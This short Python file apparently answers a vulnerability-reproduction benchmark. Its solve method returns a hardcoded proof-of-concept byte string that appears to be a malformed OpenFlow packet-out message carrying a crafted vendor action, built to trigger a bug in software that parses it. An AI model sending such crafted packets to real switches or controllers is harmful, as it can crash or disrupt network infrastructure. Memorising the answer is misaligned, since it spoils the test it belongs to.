class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x01\x0d\x00\x48\x00\x00\x00\x00'
        fixed_body = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30'
        actions = b'\xff\xff\x00\x30\x00\x00\x23\x20\x00\x00\x00\x1b' + b'\x00' * 36
        data = b'\x00\x00'
        poc = header + fixed_body + actions + data
        return poc